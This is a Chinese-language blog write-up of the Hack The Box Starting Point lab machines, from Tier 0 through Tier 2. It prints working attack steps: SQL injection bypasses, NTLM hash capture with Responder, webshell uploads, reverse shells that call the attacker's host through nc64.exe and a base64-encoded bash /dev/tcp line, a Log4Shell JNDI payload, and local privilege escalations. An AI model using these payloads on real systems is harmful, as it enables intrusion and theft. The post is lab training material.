---
title: "Happy Hacking: Hack The Box Starting Point"
date: 2024-01-20
tags:
  - 网络
  - SQLi
  - Linux
  - 文件上传
  - Java
  - Kali
  - MongoDB
categories:
  - Web 安全
---

1st episode of playing with HTB.

<!--more-->

## Tier 0

### Meow

Telnet 服务默认使用 TCP 23 端口，root 用户可以使用空密码登录，登录后获得 flag。

### Fawn

FTP 服务默认使用 TCP 21 端口，可以使用 anonymous 用户匿名登录，登录成功返回代码 230。在 ftp 命令行中使用 `get flag.txt` 下载 flag。

### Dancing

SMB 服务默认使用 TCP 445 端口，使用 `smbclient -N -L <box_ip>` 列举目录，随后通过 `smbclient \\\\<ip>\\WorkShares` 发现 `WorkShares` 是唯一无需密码即可访问的目录。最终在 `James.P` 目录下发现 `flag.txt`，同样使用 `get` 命令即可下载。

### Redeemer

Redis 服务默认使用 TCP 6379 端口，使用 `redis-cli -h <box_ip>` 进行连接，随后运行：

```
> select 0
> keys *
> get flag
```

## Tier 1

### Appointment

SQL 注入教学，使用 `'='` 作为密码即可成功登录（拼接成 `AND password=''=''`）。

### Sequel

MySQL 服务默认使用 TCP 3306 端口，使用 `mysql -u root -h <box_ip>` 进行连接，随后运行：

```sql
> show databases;
> use htb;
> show tables;
> select * from config;
```

### Crocodile

通过 FTP 匿名登录获得敏感账号密码：`admin/rKXM59ESxesUFHAd`，通过 nmap 发现主机开放 80 端口，`gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php` 可以发现存在 `/login.php`，用刚才得到的账号密码即可登录。

### Responder

浏览器访问 Box 的 IP 会跳转到 unika.htb，此时可能需要修改 hosts 才能正常访问网页，如果浏览器中有 SwitchyOmega 之类的插件还需要设置成直接连接模式。

通过语言切换页面的 URL 发现使用的是 PHP，参数 `page` 疑似存在文件包含漏洞。尝试本地文件包含成功：

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

随后启动 Responder：`sudo responder -I tun0 -wd`，并触发远程文件包含：

```
http://unika.htb/index.php?page=//<my_ip>/somefile
```

此时服务器通过 SMB 访问 Responder 服务，带出 Administrator 用户的 NTLMv2 哈希。最后用 john 爆破哈希：

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

获得 Administrator 密码 `badminton`。随后对 Box 进行端口扫描，发现 5985 端口开放，这是 Windows 远程管理服务（WinRM）的端口。使用 evil-winrm 连接即可获得 shell：

```bash
$ evil-winrm -i <box_ip> -u Administrator -p badminton
```

### Three

修改 hosts 之后，需要使用 gobuster 的 vhost 模式以及 `--append-domain` flag 进行子域名爆破：

```bash
$ gobuster vhost -u http://thetoppers.htb -w amass/subdomains-top1mil-5000.txt --append-domain thetoppers.htb
```

发现存在子域名 `s3.thetoppers.htb`，添加解析后利用 AWS CLI 列举 S3 Buckets，发现存在 `thetoppers.htb` Bucket，随后再列举文件：

```bash
$ aws configure
# ...
$ aws --endpoint http://s3.thetoppers.htb s3 ls
$ aws --endpoint http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

可以发现网站采用 PHP 编写，利用 AWS CLI 上传 Webshell 即可取得控制权：

```bash
$ aws --endpoint http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

## Tier 2

### Archetype

扫描发现 445 和 1433 端口开放，通过 `smbclient` 获取到 `prod.dtsConfig` 文件，其中包含了用户名 `sql_svc` 和 密码 `M3g4c0rp123`。随后利用 impacket 的 MSSQLClient 脚本（Kali 中可以使用 `impacket-mssqlclient`，其他脚本类似）连接 1433 端口的 SQLServer，注意使用 `-windows-auth` flag：

```bash
$ python3 mssqlclient.py sql_svc:M3g4c0rp123@<box_ip> -windows-auth
```

成功连接后，可以检查自身权限，发现属于 `sysadmin`：

```sql
> SELECT is_srvrolemember('sysadmin');
```

然后检查当前路径，发现位于 `C:\Windows\system32`：

```bash
> enable_xp_cmdshell
> xp_cmdshell "powershell -c pwd"
```

在本机上启动服务器用于给靶机下载 `nc64.exe`，注意切换靶机目录：

```bash
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<my_ip>:8000/nc64.exe -outfile nc64.exe"
```

随后实施反弹 shell，可以在 Desktop 目录下获得 user flag：

```bash
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <my_ip> 1337"
```

获取 shell 后故技重施，下载 winPEAS 并运行，发现存在命令行历史文件 `ConsoleHost_history.txt`，查看文件内容得到 Administrator 密码 `MEGACORP_4dm1n!!`：

```powershell
$ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

最后通过 impacket 的 `psexec` 脚本获取 Administrator shell：

```bash
$ impacket-psexec Administrator:MEGACORP_4dm1n\!\!@<box_ip>
```

### Oopsie

Burpsuite 爬虫发现存在登录 URL `/cgi-bin/login`，首先以 guest 身份登录，在 Account 页面发现 URL 中含有参数 `id=2`，修改为 1 后可以获得 `admin` 用户的 Access ID 34322。在 Upload 页面发现访问页面需要 admin 权限，抓包可以看到 Cookie 中可以设置 `user` 和 `role` 两项，对应 Access ID 和用户名，填入 `admin` 的即可。

继续使用 `admin` 的 cookie 上传 webshell，随后爆破目录发现上传的文件位于 `/uploads` 即可访问 webshell。随后反弹 shell 并在 `/var/www/html/cdn-cgi/login` 下发现存有数据库密码的 `db.php`：

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

此外，通过 `grep -ri passw*` 还能在 index.php 中发现 `admin` 用户的密码：

```php
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
```

通过 `/etc/passwd` 发现系统中同样存在 `robert` 用户，因此可以尝试用 `M3g4C0rpUs3r!` 切换到 `robert` 用户，并在用户 home 目录下发现 user flag。随后通过 `id` 发现 `robert` 用户属于 `bugtracker` 组，查找所有该组用户拥有的文件：

```bash
$ find / -group bugtracker 2>/dev/null
```

可以发现一个 SUID 可执行文件 `/usr/bin/bugtracker`。尝试执行：

```bash
$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 11
11
---------------

cat: /root/reports/11: No such file or directory
```

可以发现它会接收用户输入，将其拼接到 `/root/reports` 后面然后用 `cat` 读取。那么一个简单的提权思路就是修改环境变量，使 `cat` 命令指向我们自定义的 `cat` 脚本，在脚本中启动 shell 即可：

```bash
$ cd /tmp
$ echo "/bin/sh" > cat
$ chmod +x cat
$ export PATH=/tmp:$PATH
$ /usr/bin/bugtracker
```

### Vaccine

通过 FTP 下载压缩包，破解压缩包密码：

```bash
$ zip2john backup.zip > hashes
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

获得密码 `741852963`，随后在 index.php 中发现 `admin` 用户的密码 MD5 `2cb42f8734ea607eefed3b70af13bbd3`，使用 hashcat 指定 MD5 算法并破解得到密码明文：`qwerty789`：

```bash
$ echo 2cb42f8734ea607eefed3b70af13bbd3 > hash
$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
```

登录网站发现搜索框存在 SQL 注入，准备好 cookie 后用 sqlmap 跑一下：

```bash
$ sqlmap -u "http://<box_ip>/dashboard.php?search=1" --cookie="PHPSESSID=jfqqop7f3lv6d7qat8973gfsag"
```

发现 `search` 参数可以注入，加上 `--os-shell` flag 再跑一次即可获得 shell，随后反弹 shell 即可获得 `postgres` 用户的 user flag。

随后在 `/var/www/html` 目录下用 `grep -ri` 搜索发现数据库 `postgres` 用户的明文密码 `P@s5w0rd!`，测试发现同样是 Linux 用户 `postgres` 的密码。`sudo -l` 查看权限，可以执行 `/bin/vi /etc/postgresql/11/main/pg_hba.conf`，在 [GTFO Bins](https://gtfobins.github.io/gtfobins/vi/) 上可以找到相关利用方式，由于执行的命令和参数是固定的，必须先执行：

```bash
$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

进入 vi 编辑器，随后在普通模式下再运行：

```
:set shell=/bin/sh
:shell
```

或者也可以直接运行 `:!/bin/bash`。

### Unified

扫描发现 22,6789,8080,8443 端口开放，其中 8443 端口对应服务为 Unifi 6.4.54，搜索发现存在 [CVE-2021-44228](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) 漏洞。在这个漏洞中，我们需要在登陆请求的 `remember` 参数中注入 JNDI payload，让 Unifi 服务请求我们控制的恶意 LDAP 服务。

为了启动恶意 LDAP 服务，首先安装和编译 Rogue JNDI：

```bash
$ sudo apt install -y openjdk-11-jdk maven
$ git clone https://github.com/veracode-research/rogue-jndi
$ cd rogue-jndi
$ mvn package
```

随后构造 payload，并进行 Base64 编码，提供给 Rogue JNDI 启动恶意 JNDI 服务器：

```bash
$ rev_sh=$(echo 'bash -c bash -i >&/dev/tcp/<my_ip>/1337 0>&1' | base64)
$ java -jar target/RogueJndi-1.1.jar --hostname "<my_ip>" --command "bash -c {echo,$rev_sh}|{base64,-d}|{bash,-i}"
```

最后抓取登录数据包，将 `remember` 字段改为 `${jndi:ldap://<my_ip>:1389/o=tomcat}` 并发送，目标服务就会向我们的恶意 JNDI 服务器发起 LDAP 请求：

```
POST /api/login HTTP/1.1
...

{"username":"admin","password":"123456","remember":"${jndi:ldap://<my_ip>:1389/o=tomcat}","strict":true}
```

此时可以获取到反弹的 shell，将其升级为 bash：

```
script /dev/null -c bash
```

即可获得 user flag。

> 根据 Walkthrough，在启动恶意 JDNI 服务器前可以使用 tcpdump 先验证漏洞存在：`sudo tcpdump -i tun0 port 389`

随后通过 ps 发现主机上 27117 端口运行 MongoDB 服务，搜索发现 Unifi 默认数据库名为 `ace`，尝试连接并列举用户：

```bash
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
```

这里可以发现存在管理员账号 `administrator`，其密码哈希存于 `x-shadow` 字段。

```json
{
    "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
    "name" : "administrator",
    "email" : "administrator@unified.htb",
    "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uH
uonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
	...
}
```

我们可以使用自己生成的密码哈希替换该字段：

```bash
$ mkpasswd -m sha-512 123456
$6$kVChPiP/rENqcESK$fWp6VtrpgPDUTxstrS949DFd43I86gECz9mqD9/HuQf9G4hlDFAGKwn8mQlvlw7c4dvkQppO9vkhT4d2btnw3.
$ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$kVChPiP/rENqcESK$fWp6VtrpgPDUTxstrS949DFd43I86gECz9mqD9/HuQf9G4hlDFAGKwn8mQlvlw7c4dvkQppO9vkhT4d2btnw3."}})'
```

随后就可以在 web 界面使用 `administrator/123456` 登录 Unifi 管理后台了。在 Settings 中可以显示 SSH root 密码 `NotACrackablePassword4U2022`，通过 SSH 登录 root 用户即可获得 root flag。
